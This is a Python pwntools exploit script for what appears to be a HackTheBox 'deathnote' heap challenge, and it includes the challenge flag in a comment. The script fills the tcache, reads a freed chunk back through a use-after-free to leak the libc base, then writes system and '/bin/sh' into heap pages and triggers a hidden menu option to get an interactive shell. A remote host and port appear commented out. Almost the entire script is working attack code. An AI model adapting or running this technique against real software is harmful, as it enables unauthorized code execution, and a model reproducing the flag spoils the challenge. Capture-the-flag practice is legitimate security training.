from pwn import *



'''

HTB{0m43_w4_m0u_5h1nd31ru~uWu}
'''

libc = ELF("./libc.so.6")

delimiter = b'\xf0\x9f\x92\x80 ' 
def add(res,size_req,page_indx,victime_name):
    res.sendlineafter(delimiter,b'1')
    res.sendlineafter(b'request?\n\n'+delimiter,size_req)
    res.sendlineafter(b'Page?\n\n'+delimiter,page_indx)
    res.sendlineafter(b'victim:\n\n'+delimiter,victime_name)
    pass
def show(res,page_indx):
    res.sendlineafter(delimiter,b'3')
    res.sendlineafter(b'Page?',page_indx)


def delete(res,page_indx):
    res.sendlineafter(delimiter,b'2')
    res.sendlineafter(b'Page?\n\n'+delimiter,page_indx)

r= process("./deathnote_patched")

#r= remote("94.237.55.138",43767)
# gdb.attach(r,gdbscript='''
# b* _
# ''')

for i in range(10):
    add(r,b'128',str(i).encode(),b'A'*32)

for i in range(7):
    delete(r,str(i).encode())

delete(r,b'7')


show(r,b'7')

r.recvuntil(b'content:')
main_arena_96 = u64(r.recvuntil(b'\n-_-_-_-_-_-_-_-_-_-_-_\n|')[1:7]+b'\x00'*2)


libc_base = main_arena_96 - (libc.symbols["main_arena"]+96)
libc_system = libc_base+libc.symbols["do_system"]
libc_binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

print("main_arena+96", hex(main_arena_96))
print("libc base", hex(libc_base))
print("libc system", hex(libc_system))


add(r,b'16',b'1', b'/bin/sh')
add(r,b'16',b'0', (hex(libc_system)[2:]).encode())


r.sendlineafter(delimiter,b'42')


r.interactive()